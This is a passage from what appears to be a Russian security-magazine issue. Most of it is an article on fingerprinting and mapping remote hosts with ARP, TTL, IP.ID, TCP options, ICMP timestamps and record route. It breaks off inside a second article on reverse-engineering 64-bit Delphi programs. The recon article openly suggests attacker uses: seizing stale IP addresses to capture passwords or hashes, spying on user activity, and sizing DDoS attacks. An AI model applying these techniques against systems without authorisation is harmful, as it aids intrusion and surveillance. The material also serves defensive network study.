реально достать, не поднимаясь выше уровня L2/L3/L4 и не имея доступа
к удаленному серверу, а просто зная его IP-адрес и отправляя ему те или иные
пакеты. Большинство приемов применимо абсолютно к любым узлам интерне‐
та.
   Итак, используя только лишь протоколы сетевого и транспортного уровней
(IP, TCP и ICMP), мы сможем определить:
 • операционную систему;
 • сетевую активность (speed rate);
 • время непрерывной работы операционной системы (uptime);
 • время на удаленном сервере;
 • сколько серверов реально находятся за IP-адресом;
 • сколько балансировочных серверов на порте;
 • принадлежат ли порты одному серверу;
 • сколько IP-адресов у сервера;
 • топологию маршрута до цели;
 • ложные открытые порты.

В статье я буду показывать все примеры двумя способами: с помощью
базового инструментария и с использованием собственного набора скриптов.
В коде этих скриптов ты найдешь полезные примеры использования библиоте‐
ки для крафтинга пакетов scapy, чтобы при необходимости кастомизировать их
под свою задачу.


ARP

Обычно с ARP ассоциируются  атаки перехвата трафика, но мы взглянем
на этот протокол с другой стороны.
  В каждом ARP-пакете есть поле с src_mac.





И именно по содержимому этого поля мы сможем ответить на ряд вопросов.


Выявление хостов за файрволом
Думаешь, если удаленный узел не отвечает на ping, то его там нет? Когда ты
инициируешь любое обращение к узлу из текущего сетевого сегмента, будь то
команда ping или обращение через браузер, твоя ОС сначала выполняет ARP-
запрос, чтобы узнать MAC-адрес удаленного хоста. И обычно файрволы (даже
если они настроены на полную блокировку всего входящего трафика) не тро‐
гают канальные протоколы (Ethernet), а также ARP, поскольку из‑за этого может
быть нарушена работоспособность сети.
   Например, имеется хост из текущего сетевого сегмента. Этого хоста вроде
как нет, поскольку на ping он не отзывается. Тем не менее в кеше присутствует
его MAC-адрес, следовательно, сетевой узел существует.





Чтобы обнаружить подобные скрытые узлы во всем сетевом сегменте, можно
использовать скрипт, который автоматически выполняет описанные выше дей‐
ствия.





Эта информация может быть также полезна в сетях, где нет DHCP, но тебе
нужно аккуратно занять IP-адрес. Кроме того, она просто дает понимание, что
тот или иной сервер не выключен, а находится за файрволом.


Обнаружение хостов с несколькими IP
То, что в сетевом сегменте мы можем видеть MAC-адреса удаленных узлов,
позволяет выявить системы с несколькими IP-адресами.





Все просто: если нескольким IP-адресам соответствует один MAC, с большой
долей вероятности находится узел, сетевой карте которого присвоено нес‐
колько IP-адресов (alias). Стоит отметить, что так мы не увидим dual-homed-
машины (несколько сетевых карт). Как их можно обнаружить, я расскажу чуть
позже.


Определение аппаратной части удаленного хоста
Первые три октета MAC-адреса резервируются за производителями оборудо‐
вания и потому достаточно точно могут идентифицировать железо.





Хорошо видно, что рядом с нами в сети присутствуют четыре IP-камеры
и четыре сетевых устройства. Информация об этом находится в OUI-базах:
 • /usr/share/arp-scan/ieee-oui.txt;
 • /usr/share/airgraph-ng/oui.txt.

В зависимости от MAC-адреса удаленного узла мы можем сделать еще и дос‐
таточно точный вывод о том, физический перед нами сервер или виртуальный.
Например, популярная в Enterprise-секторе VMware по умолчанию использует
MAC-адреса вида 00:50:56:xx:xx:xx.


Stale Network Address Configurations
С ARP связана еще одна не столь очевидная атака под названием SNAC,
которая  выявляет  устаревшие  информационные  потоки.  Учитывая,  что
для непосредственной коммуникации узлов в локальных сетях требуется зап‐
рашиваемый по ARP MAC-адрес, и при этом запрашиваемый широковеща‐
тельно (так что его слышат все), мы можем узнать, а все ли запрашиваемые
узлы реально существуют.





Так как ARP-ответ уже не идет широковещательно, а отправляется непосредс‐
твенно запрашиваемой стороне, его мы не услышим. Поэтому скрипт выпол‐
няет  повторный  ARP-запрос,  чтобы  проверить,  реально  ли  существует
в текущем сетевом сегменте запрашиваемый хост. Если да, он подсвечива‐
ется зеленым, как действующий информационный поток, если нет — красным,
как недействующий. Во время работы скрипт постоянно обновляет граф, визу‐
ализирующий эти самые информационные потоки.





Просто анализируя ARP, можем видеть, что некто (через шлюз 192.168.8.1),
расположенный в другом сетевом сегменте, пытался соединиться с несущес‐
твующими хостами. Или например, что сразу три узла (82, 79 и 83) связыва‐
ются с хостом 192.168.8.73.
   Вполне очевидным действием будет занять свободный, но запрашиваемый
IP-адрес, присвоив своей сетевой карте сколько нужно адресов. Результатом
может стать абсолютно что угодно, любой информационный поток вплоть
до разглашения паролей (например, если присвоенный адрес принадлежит
серверу MS SQL) или хешей (если это адрес сетевого диска). Впрочем,
это уже отдельная история.
  SNAC крайне сложно увидеть невооруженным взглядом, ведь часто при‐
чиной успешной атаки становится всеми забытый конфиг. В то же время угроза
не столь очевидна, когда у сервера меняется IP-адрес: мало кто задумывается
о том, что его может занять атакующий.
  SNAC просто незаменим при атаках на так называемые стенды, когда
исследуемые узлы просто выдергиваются из продуктивных сетей, разрывая
информационные потоки.


АНАЛИЗ IP.TTL

В любом IP-пакете есть поле ttl.





Его особенность заключается в том, что каждое сетевое устройство, которое
доставляет твой IP-пакет до цели, вычитает из значения этого поля единицу.
Если устройств по пути до цели много, значение IP.ttl будет уменьшаться
по мере удлинения маршрута следования пакета. Как только содержимое поля
IP.ttl станет равным нулю, пакет удалится. Так реализована защита от зацик‐
ливания пакетов на пути следования. Отправляющая сторона вольна устанав‐
ливать любое значение ttl, a удаленная сторона при этом ответит пакетом
со своим IP.ttl.


Определение ОС
Отправляющая сторона (твой ПК) устанавливает определенное начальное зна‐
чение IP.ttl. Точно так же удаленная сторона в ответ отправит тебе пакет
со своим начальным IP.ttl (значение которого может уменьшиться на длину
трассировки). И это значение специфично для ОС.
   Существует четыре популярных начальных значения IP.ttl, достаточно
точно описывающих семейство ОС удаленного узла:
 • 255 — Cisco;
 • 128 — Windows;
 • 64 — Linux, Android, BSD, macOS;
 • 32 — embedded-системы.

Так что даже обычной командой ping мы можем определить тип операционной
системы.





В локальной сети, где между твоей машиной и целью не так много межсетевых
экранов, этот метод будет работать достаточно точно. Атакующему полученная
информация позволит сразу понять, что за устройство перед ним, и подобрать
подходящий список портов для сканирования под те или иные популярные экс‐
плоиты.
  А для защищающейся стороны повод насторожиться, если в пользователь‐
ском сегменте, где все компьютеры работают под управлением Windows,
вдруг появляется Linux (возможно даже Kali).
   Зато в глобальной сети на ping (ICMP) полагаться особо не стоит. Пакет
на пути следования преодолеет множество межсетевых экранов со своими
правилами и может попросту не дойти до цели, даже если на целевом IP слу‐
шаются порты, работают службы. Именно поэтому Nmap нужно всегда запус‐
кать с флагом -Pn, если ты уверен, что IP живой.
   Поле ttl относится к протоколу IP, а под ним, помимо ICMP (ping), работа‐
ют наши любимые TCP- и UDP-транспорты. Так что анализировать IP.ttl мож‐
но прямо с TCP-порта.





Если на удаленном IP имеется ряд открытых портов, то далеко не факт, что все
порты будут иметь одинаковый IP.ttl. Нужно иметь в виду, что в интернете
не всегда весь сервер относится к одному IP-адресу. На деле это может быть
некое сетевое устройство, отправляющее часть портов на один сервер в DMZ,
а часть на другие.





В данном случае, судя по IP.ttl, мы можем заключить, что за IP-адресом
реально скрывается четыре системы. Причем одна из них — это Windows
и три — Unix. Чуть позже мы научимся определять принадлежность портов
к системам более точно.


Выявление помех
То, что IP.ttl будет уменьшаться с удлинением  маршрута, мы можем
использовать для определения помех при сканировании — ложных срабаты‐
ваний. Достаточно часто при сканировании из «цензурируемых» сетей (кор‐
поративные сети, VPN и подобное) часть трафика не выходит наружу. Чаще
всего ты этого даже не заметишь, но иногда это проявляется в наличии ложных
открытых портов. Так получается из‑за того, что определенные соединения
заворачивают на тот или иной внутренний  узел, например  Proxy-, DNS-
или SMTP-сервер. На иллюстрации ниже показан наглядный пример такой
ситуации.





Но если посмотреть на IP.ttl ответных пакетов, то мы заметим нечто стран‐
ное.





                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИCOVERSTORY
            КУНГ-ФУ
       ENUMERATION
                      СОБИРАЕМ ИНФОРМАЦИЮ
                      ОБ АТАКУЕМОЙ СИСТЕМЕ




Вспоминаем про начальные значения IP.ttl: 255, 128, 64, 32, и картина
начинает проясняться. У двух портов IP.ttl изменился на 6, что в общем
похоже на правду, но у одного из портов значение изменилось только на 1.
Иными словами, между тобой и целью (сервером Google) одно сетевое
устройство, словно вы оба находитесь в Кремниевой долине, а не на разных
континентах. В результате мы понимаем, что сетевое оборудование твоего
провайдера, корпоративного офиса или VPN заворачивает эту часть трафика.
   Понимание этого сильно упростит жизнь при исследовании сети.


Обнаружение пути
Тот факт, что каждое сетевое устройство, пересылающее твой трафик, умень‐
шает IP.ttl на 1, и то, что ты можешь установить произвольное начальное
значение IP.ttl, можно использовать для хитрого, но достаточно известного
трюка — traceroute.
   Суть трассировки в том, что мы сперва отправляем пакет с очень коротким
IP.ttl=1. Такой пакет не пройдет дальше первого хопа и будет удален им,
но при удалении вежливое сетевое устройство, как правило, уведомляет
об этом  отправителя специальным ICMP-пакетом. Фиксируя такой пакет,
а именно IP-адрес отправителя, мы вычисляем адрес первого хопа. Потом мы
отправляем тот же пакет с IP.ttl=2 и получаем ответ от второго хопа. И так
далее. В конце концов мы вычислим IP-адреса всех сетевых устройств на пути
движения пакета до цели.





Тонкость в том, что по умолчанию Windows и Linux выполняют трассировку
по‑разному. Windows использует для этого протокол ICMP, а Linux — UDP. И это
может привести к разному результату. Нужно понимать, что разные пакеты
могут использовать разные маршруты. Проверить это мы можем, выполнив
три разные трассировки с TCP, UDP и ICMP на один и тот же IP-адрес.





На этих скриншотах мы видим, что реальный путь движения пакета до того же
самого узла немного менялся.
   Нужно иметь в виду, что для одного и того же пакета существует сразу нес‐
колько возможных путей, по которым пакет может пойти с той или иной сте‐
пенью вероятности. Это можно заметить опять же по изменению IP.ttl
при неизменных условиях.





Путь движения пакета периодически меняется на 13 хопов. Подобное изме‐
нение IP.ttl  свидетельствует об  изменении  маршрута (исходный IP.
ttl=128). И иногда это может служить сигналом, что трафик глобально перех‐
ватывается.
   Если же IP.ttl периодически меняется на ttl\<64 или 128\<ttl\<255,
это свидетельствует о смене обслуживающего сервера (то есть о балансиров‐
ке). Чуть позже мы научимся более точно определять балансировочные сер‐
веры.
   Анализ движения трафика множества пакетов уже требует некоторой визу‐
ализации:



 msf> services -c port,proto
 sudo ./path_discover.py
 8.8.8.8 53 tcp
 8.8.8.8 53 udp
 ^D





На этом простом примере мы видим, на каком узле расходятся маршруты.
Используемый нами инструмент любезно группирует информацию по авто‐
номным зонам, проще говоря — ответственным компаниям.
   Информация о маршруте может быть полезна, например, для понимания
того, оборудование какой компании блокирует трафик, или при подготовке
атаки на промежуточное сетевое оборудование, с целью последующего перех‐
вата целевого трафика.
   Трассировка может быть еще более информативной, если привязать IP-
адреса к геолокации. Тогда движение трафика станет еще нагляднее.





Забавно, но если верить geoip, то пакет, наверное, мог бы не покидать страну.
Далее в этой статье мы вернемся к geoip traceroute, добавив к этому инстру‐
менту еще несколько полезных вещей.


АНАЛИЗ IP.ID

В каждом IP-пакете есть поле identification.





Это своего рода порядковый номер. Поскольку пакеты к цели могут прийти
не в том порядке из‑за временных задержек, это поле используется для вос‐
становления корректной последовательности IP-пакетов.


Определение использования трафика
У многих ОС, включая некоторые Unix и, конечно же, Windows, есть особен‐
ность. Изменение IP.id может иметь глобальный характер. То есть если удален‐
ный узел отправлял пакеты кому‑то еще, кроме тебя, то поле IP.id в его пакетах
изменится более чем на единицу. Эту простую особенность мы можем
использовать для определения сетевой активности хоста.





Мы видим, что IP.id в ответе изменился более чем на единицу, значит, между
нашим запросом и ответом удаленный узел успел что‑то скачать или, наобо‐
рот, что‑то качали с него.
   Анализ активности сетевого хоста может помочь во многих случаях. Нап‐
ример, атакующий может подгадать момент, когда за ПК не ведется работа,
чтобы выполнить над ним какие‑то злонамеренные действия, которые поль‐
зователь не заметит. Или определить по трафику посещаемость сайта и сде‐
лать выводы о перспективности его компрометации. Ну или можно просто
пошпионить за пользователем.
  На самом деле возможность видеть активность любого хоста в интерне‐
те — это большая сила, особенно если хост бездействует (IP.id ++1), тогда
можно отслеживать моменты, в которые к нему происходит обращение. Нап‐
ример, если это SMTP-сервер, то мы можем проверить факт доставки письма
по небольшому всплеску сетевой активности. Конечно, это не полноценный
сетевой сниффер, зато работает он незаметно и почти везде. И тут мы плавно
подходим к так называемым корреляционным атакам, сложной, но мощной
технике для деанона. Но это уже другая история... Словом, в зависимости
от ситуации и фантазии описанный прием позволяет найти ответы на многие
вопросы.
  Но что нам мешает увидеть сетевую активность сразу ряда машин по опре‐
деленному TCP-порту?





Мы видим, что какие‑то серверы «отдыхают», а на какие‑то приходят запросы.
Некоторые работают под управлением Windows  (ttl=128), на других стоит
Linux (ttl=64), и один шлюз — устройство Cisco (ttl=255). Изменения тра‐
фика на шлюзе в разы меньше, чем изменения на всех устройствах, вместе
взятых, — значит, большая часть сетевого взаимодействия с серверами про‐
исходит в пределах одного сетевого сегмента, то есть без участия шлюза.
   Поскольку id и ttl находятся в IP-слое пакета, мы можем анализировать
их, комбинируя с трассировкой (TCP, UDP, ICMP). Так можно увидеть сетевую
активность каждого устройства, через которое проходит пакет на пути к цели.





Вполне предсказуемо по IP.ttl видно, что трафик шел главным образом
через устройства Cisco. По изменению же IP.id мы можем анализировать заг‐
руженность сетевых устройств и определять, сколько чужого трафика проходит
этими путями. Однако такое поведение встречается не в каждом случае.
   Стоит помнить, что поле IP.id — это всего лишь два байта, а значит, оно
обнулится после 65 535 пакетов. Следовательно, если значение IP.id изме‐
нилось будто бы случайным образом, скорее всего, это из‑за того, что зна‐
чение IP.id успевает сделать полный круг, возможно даже несколько раз. Зна‐
чит, удаленный узел отправляет больше 65 тысяч пакетов за секунду. Тогда
можно использовать меньший интервал между отправками пакетов для более
точных замеров изменения IP.id.





Теперь мы видим, что приращение IP.id имеет более внятный характер
и именно столько пакетов за 100 мс успевает отправить удаленный хост.
   Для режима трассировки подобное будет сложно реализовать базовыми
средствами, так как для каждого хопа требуется выставлять свое значение IP.
ttl и отправлять сразу два пакета почти сразу друг за другом, после чего
сравнивать  дельту  IP.id.  Это  реализовано  только  в  моем  скрипте
traceroute.py.


Idle scan
Предсказуемое значение IP.id может быть использовано даже для взаимо‐
действия с целью при сканировании через промежуточный узел.





Подобный прием позволяет анонимно «прощупывать» удаленный хост, под‐
ставляя вместо IP-адреса отправителя некий третий хост с предсказуемым
изменением IP.id при условии, что он «отдыхает».





Мы видим, что IP.id не менялся более чем на единицу, пока не был отправ‐
лен еще один пакет. Именно так выполняется поиск зомби‑хостов, а само ска‐
нирование реализовано во всем известном Nmap как режим idle scan.





Стоит только иметь в виду, что подделка IP-адреса отправителя возможна
далеко не во всех сетях.


TCP.OPTIONS

В транспортном протоколе TCP содержится поле options.





Получение uptime
Один из параметров в этом поле — запрос uptime удаленного узла. Запросить
его вполне легально мы можем абсолютно для любого удаленного хоста.





Например, в локальной сети мы можем увидеть, когда пользователи пос‐
ледний раз выключали свои ПК или как долго работают серверы.





Именно так атакующий определяет роль хоста — сервер (высокий uptime)
или рабочая станция (низкий uptime).
   Если у серверов примерно схожий uptime, мы можем предположить, что
имело место аварийное отключение электропитания или массовый перезапуск
по какой‑то другой причине. Словом, подключаем дедукцию.


Выявление ОС
В интернете, как мы помним, весьма часто часть портов с IP-адреса просто
пересылается на те или иные серверы DMZ. Для атакующего такая информа‐
ция, пожалуй, не была бы лишней. Ведь всегда приятнее работать, когда
перед глазами имеется карта топологии сети.
   Чтобы узнать, какие порты соотносятся с различными системами, можно
запросить uptime с каждого порта и сгруппировать по нему результаты ска‐
нирования. К примеру, основываясь только на анализе IP.ttl, мы можем зак‐
лючить, что за исследуемым IP-адресом «прячутся» две системы, поскольку
в пакетах содержатся разные ttl.





То, что за данным IP скрывается не один сервер, также подтверждает анализ
uptime, однако хостов выявлено еще больше — три.





                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИCOVERSTORY
            КУНГ-ФУ
       ENUMERATION
                      СОБИРАЕМ ИНФОРМАЦИЮ
                      ОБ АТАКУЕМОЙ СИСТЕМЕ




Такой анализ полезен, если на удаленном хосте обнаружены порты неизвес‐
тного назначения, в то время как информация о некоторых портах у нас есть.
Когда IP-адрес один, провести такой анализ не составит  труда, но, если
перед нами множество целей, разобраться с ними поможет дополнительная
визуализация:



 sudo ./path_discover_group.py
 8.8.8.8 53 tcp
 8.8.8.8 443 tcp





Умение выявлять подобные особенности позволяет подмечать общие черты
у разных адресов. Например, один и тот же сервер вполне может оказаться
на разных IP, но на одном порте и так далее.
   Если в интернете за одним IP могут скрываться несколько серверов, то
в локальной сети чаще наблюдается обратное — когда у одного сервера нес‐
колько адресов (alias или dual-homed). Группировка результатов сканирования
по uptime может выявить такие узлы.





Мы видим, что, вероятнее всего, два отмеченных на скриншоте IP-адреса
на самом деле являются одним и тем же сервером, у которого несколько IP-
адресов на сетевой карте (alias) либо же несколько сетевых карт (dual-homed).
В локальной сети информация о множественности IP-адресов у сетевых узлов
может быть также полезна, например, при проведении relay-атак.


Определение количества балансировочных серверов
В интернете не только за одним IP-адресом может скрываться множество сис‐
тем, но и за одним портом может прятаться несколько серверов. Это называ‐
ется «балансировка», и встречается она, как правило, на высоконагруженных
сервисах. Если мы какое‑то время будем подключаться к удаленному порту
и анализировать его uptime, то, сгруппировав результаты, мы получим пример‐
ное количество балансировочных серверов.





На приведенном выше скриншоте мы видим, что 36 раз ответ пришел от сер‐
вера с uptime 29 дней, а 19 раз — с uptime 11 дней и так далее. Полагаясь
на факт, что идентичный uptime у разных серверов редко встречается, можно
заключить, что этот сайт обслуживают примерно пять серверов.
   Знание того, сколько серверов обрабатывают запросы, может оказаться
очень кстати, например для расчета мощности при DDoS-атаке. Также, если
на  удаленном  узле вдруг  обнаружилась RCE,  стоит  обратить  внимание
на балансировку, ведь так можно приумножить количество захваченных сер‐
веров.


ICMP.TYPE=13

Сетевой протокол ICMP поддерживает множество типов запросов.





Получение локального времени UTC
С помощью одного из запросов мы можем получить timestamp, который
используется для определения локального времени удаленного хоста. В ICMP-
пакете оно представлено в поле Transmit  timestamp в виде числа мил‐
лисекунд, прошедших от полуночи по UTC.





Видно, что между originate (текущая система) и transmit (удаленная) есть
расхождение. Оно как раз и показывает, что наши локальные часы и часы
на удаленном сервере не совпадают.
   Windows отдает timestamp в противоположном порядке байтов (big endian),
в то время как Unix — в little endian. В скрипте icmp_ts.py предусмотрено
отличие Windows от Linux по IP.ttl, так что теперь можно определить время
на любых узлах в сети.





Знание времени поможет как с относительной идентификацией ОС (по ана‐
логии с uptime), так и при попытке использовать протокол, который требует
синхронизации (например, SSL/TLS или Kerberos).


TCP.FLAGS

У транспортного протокола TCP существует поле flags.





Это поле используется для управления состоянием соединения.


Выявление помех
В самом начале статьи мы уже касались темы выявления помех. Но проявля‐
лась она в побочных открытых портах. Однако куда более часто возможна
обратная ситуация, когда на цели открыт порт, но твоя сеть или непосредс‐
твенно файрвол перед целью фильтрует этот порт. В таком случае открытый
порт на цели ты не увидишь.
   Существуют некоторые особенности того, как операционные системы дол‐
жны обрабатывать не совсем обычные последовательности флагов в TCP-
соединениях.  Таких  особенностей  достаточно  много,  некоторые  из  них
ОС‑специфичны. Однако общей является реакция протокола TCP на ACK-
пакет, на который любая система должна ответить, неважно, открыт порт
или закрыт.





Сетевые экраны далеко не всегда способны настолько точно соответствовать
поведению ОС, что, в общем‑то, и не особо нужно. Поэтому если между тобой
и целью есть файрвол, то ответа от цели на такие специальные пакеты пос‐
тупать уже не будет.





Таким образом мы можем определить наличие брандмауэра между  ата‐
кующим и целевой системой.


Определение ОС
Было бы странно не упомянуть известный инструмент p0f, который определяет
OS fingerprint подобно тому, как мы делали это по IP.ttl, но использует
более широкий набор свойств и, следовательно, делает это точнее. В IP-
и TCP-слоях пакета содержится целый ряд дополнительных полей, дефолтные
значения которых специфичны для разных ОС. И если по IP.ttl мы лишь
определяли семейство ОС Windows, Unix или Cisco, то, анализируя TCP, можно
более точно предсказать даже версию ОС удаленного узла. По сути, это целая
база данных, сам инструмент можно отыскать по пути /usr/share/p0f/p0f.
fp или /etc/p0f/p0f.fp. Тулза работает полностью пассивно, просто слушая
трафик, который требуется самостоятельно инициировать.





IP.OPTIONS

У сетевого протокола IP также есть поле options.





Разглашение хопов
В давние времена,  когда память активного сетевого оборудования была
невелика, обратный маршрут следования пакета записывался прямо в IP-
заголовок. Именно для  этого была  придумана IP-опция record  route.
Информация, получаемая из record  route, содержит больше сведений,
нежели в классическом traceroute.





Record route не просто записывает адреса хопов на пути следования сетево‐
го пакета, он фиксирует адреса всех сетевых интерфейсов, как входящих, так
и исходящих, через которые пакет шел до цели. В то время как трассировка
покажет только IP-адрес на исходящем интерфейсе, смотрящем в сторону
отправителя.
   Изучив представленный выше скриншот, мы можем сделать следующие
выводы:
 • пакет сперва пришел на сетевое устройство с 10.0.1.4 , после чего с это‐
   го устройства, с интерфейса 10.0.1.6 , пошел дальше, на 192.168.255.
  17 ;
 • затем он покинул устройство с интерфейса 192.168.27.1 ;
 • в конечном счете пакет достиг цели 192.168.27.61 , так сказать, раз‐
   вернулся, и пошел ответ с того же адреса 192.168.27.61 , о чем сви‐
   детельствуют две одинаковые записи;
 • на обратном пути следования пакета маршрут записывался по той же
   логике, до максимально возможного количества записей в IP-пакете, рав‐
   ного восьми.

То же самое можно провернуть и с помощью Nmap.





Для дальнейших экспериментов с Record Route можно использовать мой
пример на scapy  (rr_test.py). Восстановление хопов с помощью Record
Route или того же traceroute, в принципе, может быть использовано для пос‐
троения топологии сети, что реализовано, например, в открытом инструменте
zenmap или ряде платных продуктов.


ВЫВОДЫ

Мы узнали, как много самых разнообразных и неочевидных фактов о целях
можно получить, только изучив самые верхние сетевые и транспортные про‐
токолы. А сколько информации можно вытащить, спустившись до уровня при‐
ложений?
   Enumeration — это даже еще не начало поиска изъянов в защите, ведь мы
не запускали разнообразные активные тесты на уязвимости и мисконфиги,
не успели проверить пароли или пассивно проверить версии. Но мы уже соб‐
рали о целях довольно большой объем информации. Ведь никогда не знаешь,
какие уязвимости будут найдены на следующем этапе и в какой пазл это в ито‐
ге сложится. Вполне вероятно, что крошечная недостающая крупица информа‐
ции превратится в рабочий attack chain и система окажется пробитой.
   Даже если та или иная особенность не представляет опасности сама
по себе, собранные сведения злоумышленник может использовать для реали‐
зации последующих атак.
ВЗЛОМ





      РЕВЕРСИМ 64-РАЗРЯДНЫЕ
       ПРИЛОЖЕНИЯ НА DELPHI





Программы на  Delphi пусть и  нечасто,
но все же попадают в руки любителей
поковыряться в чужом софте. Сегодня мы
разберем методы реверса и отладки таких
приложений. А заодно запасемся нужными            МВК
инструментами.


Хорошего хакера от хорошего кодера отличает то, что первый не просто зна‐
ком со всеми необходимыми для выполнения текущей задачи инструментами
и умеет ими пользоваться, но также понимает их внутреннее устройство
и принципы работы. Чтобы при необходимости обойтись без них, просто
руками выполнив действие, под которое инструмент по каким‑то причинам
не был заточен.
   Одна из самых  благодатных тем для хакеров — реверс приложений
на Delphi. Об этом написано множество статей (в том числе и в «Хакере»),
а также создано множество удобных инструментов, облегчающих хакерам
жизнь. Однако тема настолько обширна, что даже эти инструменты не охва‐
тывают ее полностью: всегда найдутся случаи, когда все тулзы бессильны
и приходится проявлять хакерскую смекалку.
   Итак, сформулируем задачу. Имеется 64-битное приложение, первичный
анализ которого при помощи DIE выдает его родство с Delphi.





Вроде бы все хорошо, однако на приведенном выше скриншоте нетрудно
заметить взаимоисключающие параметры: предлагаемый анализатором Delphi
не может быть 64-битным. Переключив режим сканирования с автоматичес‐
кого на Nauz File Detector, проясняем возникшее недоразумение.





Конечно же, это гораздо более поздняя версия Embarcadero Delphi 35.0
(28.0.44500.8973). Естественно, перед нами не XE7+, а целый XE11+. Данное
открытие совсем нас не радует — общеизвестные инструменты DeDe и IDR
не то что столь свежую версию не понимают, они вообще не умеют работать
с 64-битным Delphi.
   Есть робкая надежда на зачаточную бета‑версию IDR64 , однако и она
не признает наш модуль родным. Не откладываем ее далеко, она нам
еще пригодится, гуглим дальше.
   Находим занятный проект питоновского скрипта под IDA. Его авторы обна‐
ружили в Delphi и успешно эксплуатируют интересную фичу. При выходе
из внутреннего метода (Event Constructor) регистр EDX будет содержать ссылку
на имя обработчика события. Адрес обоаботчика будет находиться в регистре
EAX, примерно так, как показано на следующем скриншоте.





Проанализировав код 32-битных хендлеров, они выделили общий паттерн
для поиска 80 E3 DF 75 ?? 49 75 ?? 8B 46 02 ?? ?? 5B C3 (соответству‐
ющие ему байты помечены плюсиком):


.text:00408DB8              loc_
408DB8:                              ; CODE XREF: sub_408D68+67↓j
.text:00408DB8 8A 5C 31 06                  mov
bl, [ecx+esi+6]
.text:00408DBC F6 C3 80                     test    bl, 80h
.text:00408DBF 75 E1                        jnz     short loc_
408DA2
.text:00408DC1 32 1C 11                     xor     bl, [ecx+edx]
.text:00408DC4 F6 C3 80                     test    bl, 80h
.text:00408DC7 75 D9                        jnz     short loc_
408DA2
.text:00408DC9 80+ E3+ DF+                  and     bl, 0DFh
.text:00408DCC 75+ D0                       jnz     short loc_
408D9E
.text:00408DCE 49+                          dec     ecx
.text:00408DCF 75+ E7                       jnz     short loc_
408DB8
.text:00408DD1
.text:00408DD1              loc_
408DD1:                              ; CODE XREF: sub_408D68+4C↑j
.text:00408DD1 8B+ 46+ 02+                  mov     eax, [esi+2]
.text:00408DD4
.text:00408DD4              loc_
408DD4:                              ; CODE XREF: sub_408D68+34↑j
.text:00408DD4 5F                           pop     edi
.text:00408DD5 5E                           pop     esi
.text:00408DD6 5B+                          pop     ebx
.text:00408DD7 C3+                          retn

Аналогичный код хендлера для 64-битной версии находится по паттерну 80 ??
?? 00 74 ?? E8 ?? ?? ?? ?? 48 8B ?? ?? 48 8D ?? ?? ?? ?? ?? ?? C3.
Например, вот как это выглядит для версии 31 (10.1).





Код будет таким (соответствующие паттерну байты тоже помечены плюсиком):


55              push    rbp
57              push    rdi
56              push    rsi
53              push    rbx
48 83 EC 48     sub     rsp, 48h
48 8B EC        mov     rbp, rsp
48 89 CB        mov     rbx, rcx
4C 89 C6        mov     rsi, r8
48 8B 0A        mov     rcx, [rdx]
48 89 F2        mov     rdx, rsi
E8 94 89 E5 FF  call    sub_40E690
48 89 45 38     mov     [rbp+var_s38], rax
48 83 7D 38 00  cmp     [rbp+var_s38], 0
0F 94 C0        setz    al
88 45 37        mov     [rbp+var_s37], al
48 83 7B 68 00  cmp     qword ptr [rbx+68h], 0
74 1D           jz      short loc_5B5D2F
48 8D 7B 68     lea     rdi, [rbx+68h]
48 8B 4F 08     mov     rcx, [rdi+8]
48 89 DA        mov     rdx, rbx
49 89 F0        mov     r8, rsi
4C 8D 4D 38     lea     r9, [rbp+var_s38]
48 8D 45 37     lea     rax, [rbp+var_s37]
48 89 44 24 20  mov     [rsp+var_s20], rax
FF 17           call    qword ptr [rdi]
80+ 7D 37 00+   cmp     [rbp+var_s37], 0
74+ 05          jz      short loc_5B5D3A
E8+ B6 F9 FF FF call    sub_5B56F0
48+ 8B+ 45 38   mov     rax, [rbp+var_s38]
48+ 8D+ 65 48   lea     rsp, [rbp+48h]
5B              pop     rbx
5E              pop     rsi
5F              pop     rdi
5D              pop     rbp
C3+             retn

Легко убедиться, что при останове в конце этой функции адресу метода
в регистре RAX соответствует его имя в регистре RDI (да‑да, в коде скрипта
ошибка, не RDX, а RDI).





Но это мелочь, поскольку недостатки данного метода видны невооруженным
глазом. Трассировать программу ради того, чтобы получить весьма ограничен‐
ный список методов, довольно тоскливо, да и вообще если программа под‐
лежит запуску и трассировке, то это большое везение. И наконец, самая глав‐
ная беда — в нашей целевой версии XE11 аналогичного кода нет и быть
не может, поскольку там весь этот процесс, судя по всему, проходит в недрах
библиотеки rtl280.dll.
   Подумаем, чем еще нам может пригодиться IDR64. Я немного покривил
душой, упомянув ее отказ от родства с нашим модулем. Конечно, у нее отсутс‐
твует база знаний по XE11. По сути, она только три версии и знает. Поэтому
при открытии в режиме автодетекта сомневается в «дельфовости» нашей
программы.  Однако если  немного  схитрить и  попробовать  открыть ее
как Delphi XE4, а затем согласиться с native knowledge base, то IDR64 вовсе
не противится этому и после очень долгих раздумий кое‑как загружает прог‐
рамму в себя.
    Конечно, она полноценно не  восстанавливает всю  структуру модулей
и классов, однако из восстановленного ею кода можно почерпнуть значительно
больше информации, чем из IDA. В  частности, мы получим список имен
методов и классов, не говоря уже о том, что IDA чертовски не любит паскалев‐
ские строки со счетчиком.
  И в заключение я, как и обещал, немного расскажу о примерной внутренней
структуре дельфовского кода и принципах его анализа «голыми руками». Когда
мы анализировали дельфовские приложения при помощи IDR, то заметили, что
для каждого скомпилированного класса присутствует своя характерная струк‐
тура данных, называемая VMT. Структура не документирована, однако, погуг‐
лив, можно найти старую статью с ее описанием . В ней эта структура описыва‐
ется (как тип в синтаксисе дельфи) следующим образом:


type
  PClass = ^TClass;
  PSafeCallException = function  (Self: TObject; ExceptObject:
    TObject; ExceptAddr: Pointer): HResult;
  PAfterConstruction = procedure (Self: TObject);
  PBeforeDestruction = procedure (Self: TObject);
  PDispatch           = procedure (Self: TObject; var Message);
  PDefaultHandler    = procedure (Self: TObject; var Message);
  PNewInstance       = function  (Self: TClass) : TObject;
  PFreeInstance      = procedure (Self: TObject);
  PDestroy            = procedure (Self: TObject; OuterMost:
ShortInt);
  PVmt = ^TVmt;
  TVmt = packed record
    SelfPtr            : TClass;
    IntfTable         : Pointer;
    AutoTable         : Pointer;
    InitTable         : Pointer;
    TypeInfo           : Pointer;
    FieldTable        : Pointer;
    MethodTable       : Pointer;
    DynamicTable      : Pointer;
    ClassName         : PShortString;
    InstanceSize      : PLongint;
    Parent             : PClass;
    SafeCallException : PSafeCallException;
    AfterConstruction : PAfterConstruction;
    BeforeDestruction : PBeforeDestruction;
    Dispatch           : PDispatch;
    DefaultHandler    : PDefaultHandler;
    NewInstance       : PNewInstance;
    FreeInstance      : PFreeInstance;
    Destroy            : PDestroy;
